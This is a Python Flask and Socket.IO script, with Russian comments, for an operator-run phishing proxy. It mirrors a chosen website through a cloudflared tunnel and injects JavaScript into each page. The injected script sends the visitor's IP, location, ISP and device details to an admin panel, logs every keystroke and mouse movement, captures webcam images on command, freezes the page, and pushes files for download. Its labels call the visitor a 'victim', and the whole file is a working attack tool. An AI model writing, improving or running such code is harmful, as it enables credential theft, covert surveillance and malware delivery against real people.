import os, requests, subprocess, threading, uuid, base64, time
from flask import Flask, request, render_template_string, Response, send_from_directory
from flask_socketio import SocketIO, emit
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
# Пофиксил лимиты и инициализацию
socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=1e8)
ADMIN_TOKEN = str(uuid.uuid4())

for d in ['captures', 'uploads']:
    if not os.path.exists(d): os.makedirs(d)

STATE = {"target": "", "base_url": "", "tunnel": "Starting..."}

AGENT_JS = """
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
<script>
const socket = io({transports: ['websocket', 'polling']});

// Сбор детальной инфы
async function getFullIntel() {
    let geo = {city: 'Unknown', isp: 'Unknown'};
    try {
        const res = await fetch('https://ipapi.co/json/');
        geo = await res.json();
    } catch(e) {}
    
    socket.emit('client_init', {
        ua: navigator.userAgent,
        lang: navigator.language,
        res: window.screen.width + 'x' + window.screen.height,
        platform: navigator.platform,
        ip: geo.ip,
        city: geo.city,
        isp: geo.org
    });
}
getFullIntel();

let lastMove = 0;
document.onmousemove = e => {
    const now = Date.now();
    if (now - lastMove > 50) {
        socket.emit('mouse_move', {x: e.pageX, y: e.pageY});
        lastMove = now;
    }
};

document.addEventListener('keydown', e => {
    socket.emit('log_ev', {type:'KEY', val: e.key, target: e.target.tagName});
});

window.onscroll = () => socket.emit('scroll_sync', {y: window.scrollY});

socket.on('cmd', d => {
    if(d.type === 'cam_shot') {
        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.createElement('video');
            v.srcObject = s; v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                socket.emit('log_ev', {type:'CAM', val: c.toDataURL('image/jpeg')});
                s.getTracks().forEach(t => t.stop());
            }, 1000);
        });
    }
    if(d.type === 'freeze') document.body.style.pointerEvents = d.val ? 'none' : 'auto';
    if(d.type === 'push_file') {
        const a = document.createElement('a');
        a.href = d.val; a.download = d.name;
        document.body.appendChild(a); a.click(); a.remove();
    }
});
</script>
"""

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
    url = urljoin(STATE["base_url"], path + ("?" + request.query_string.decode() if request.query_string else ""))
    try:
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get(url, headers=h, stream=True, timeout=10)
        if "text/html" in r.headers.get("Content-Type", ""):
            soup = BeautifulSoup(r.text, 'html.parser')
            for tag in soup.find_all(True):
                for attr in ['src', 'href', 'data-src']:
                    if tag.has_attr(attr) and not tag[attr].startswith(('http', 'data:', 'javascript:')):
                        tag[attr] = urljoin('/', tag[attr])
            if soup.body: soup.body.append(BeautifulSoup(AGENT_JS, 'html.parser'))
            return str(soup)
        return Response(r.content, content_type=r.headers.get("Content-Type"))
    except: return "Offline", 404

@app.route('/upload_push', methods=['POST'])
def upload_push():
    file = request.files['file']
    path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
    file.save(path)
    # Пофиксил TypeError: убрал broadcast=True (в socketio.emit он по умолчанию True)
    socketio.emit('cmd', {'type': 'push_file', 'val': f"{request.host_url}get_file/{file.filename}", 'name': file.filename})
    return {"status": "ok"}

@app.route('/get_file/<name>')
def get_file(name):
    return send_from_directory(app.config['UPLOAD_FOLDER'], name)

@app.route(f'/{ADMIN_TOKEN}')
def admin():
    return render_template_string("""
    <body style="background:#000;color:#0f0;font-family:monospace;margin:0;display:flex;height:100vh;overflow:hidden;">
        <div style="width:350px;border-right:1px solid #333;padding:15px;overflow-y:auto;background:#050505;">
            <h3 style="color:#fff;border-bottom:1px solid #333;">[ RECON CENTER ]</h3>
            <div id="intel" style="font-size:11px;background:#111;padding:10px;margin-bottom:10px;border-radius:5px;color:#0af;">
                Waiting for victim...
            </div>
            <hr>
            <input type="file" id="f_input" style="display:none" onchange="uploadFile()">
            <button onclick="document.getElementById('f_input').click()" style="width:100%;padding:10px;margin-bottom:5px;cursor:pointer;">↑ PUSH FILE</button>
            <button onclick="cmd('cam_shot')" style="width:100%;color:red;">CAPTURE CAM</button>
            <button onclick="cmd('freeze', true)" style="width:48%;">FREEZE</button>
            <button onclick="cmd('freeze', false)" style="width:48%;">UNFREEZE</button>
            <hr>
            <div id="logs" style="font-size:11px;color:#777;"></div>
        </div>
        <div style="flex-grow:1;position:relative;">
            <iframe id="v" src="/" style="width:100%;height:100%;border:none;pointer-events:none;"></iframe>
            <div id="c" style="position:absolute;width:12px;height:12px;background:red;border-radius:50%;top:0;left:0;z-index:1000;box-shadow:0 0 10px red;"></div>
            <img id="cam_res" style="position:absolute;top:20px;right:20px;width:320px;border:2px solid red;display:none;z-index:2000;">
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            const socket = io();
            function cmd(type, val) { socket.emit('admin_cmd', {type, val}); }
            
            async function uploadFile() {
                let fd = new FormData();
                fd.append('file', document.getElementById('f_input').files[0]);
                await fetch('/upload_push', {method:'POST', body:fd});
            }

            socket.on('m_move', d => { const c=document.getElementById('c'); c.style.left=d.x+'px'; c.style.top=d.y+'px'; });
            socket.on('s_sync', d => { document.getElementById('v').contentWindow.scrollTo(0, d.y); });
            
            socket.on('upd_intel', d => {
                document.getElementById('intel').innerHTML = `
                    <b>IP:</b> ${d.ip}<br>
                    <b>CITY:</b> ${d.city}<br>
                    <b>ISP:</b> ${d.isp}<br>
                    <b>RES:</b> ${d.res}<br>
                    <b>UA:</b> ${d.ua}
                `;
            });

            socket.on('upd_log', d => {
                if(d.type === 'CAM') {
                    const img = document.getElementById('cam_res');
                    img.src = d.val; img.style.display = 'block';
                } else {
                    const l = document.getElementById('logs');
                    l.innerHTML = `<div>[${d.type}] ${d.val}</div>` + l.innerHTML;
                }
            });
        </script>
    </body>
    """)

@socketio.on('client_init')
def h_init(d):
    emit('upd_intel', d, broadcast=True)
    print(f"[RECON] Victim joined: {d['ip']} from {d['city']}")

@socketio.on('admin_cmd')
def h_admin(d): emit('cmd', d, broadcast=True)
@socketio.on('mouse_move')
def h_mouse(d): emit('m_move', d, broadcast=True)
@socketio.on('scroll_sync')
def h_scroll(d): emit('s_sync', d, broadcast=True)
@socketio.on('log_ev')
def h_log(d):
    if d['type'] == 'CAM':
        fn = f"captures/shot_{int(time.time())}.jpg"
        with open(fn, "wb") as f: f.write(base64.b64decode(d['val'].split(",")[1]))
    emit('upd_log', d, broadcast=True)

def tunnel():
    p = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"], 
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(p.stdout.readline, ""):
        if ".trycloudflare.com" in line:
            url = "https://" + line.split("https://")[1].strip()
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"TARGET: {STATE['target']}\nVICTIM: {url}\nADMIN:  http://127.0.0.1:5000/{ADMIN_TOKEN}\n" + "-"*40)
            break

if __name__ == "__main__":
    STATE["target"] = input("TARGET >> ")
    if not STATE["target"].startswith("http"): STATE["target"] = "https://" + STATE["target"]
    STATE["base_url"] = f"{urlparse(STATE['target']).scheme}://{urlparse(STATE['target']).netloc}"
    threading.Thread(target=tunnel, daemon=True).start()
    socketio.run(app, port=5000, log_output=False)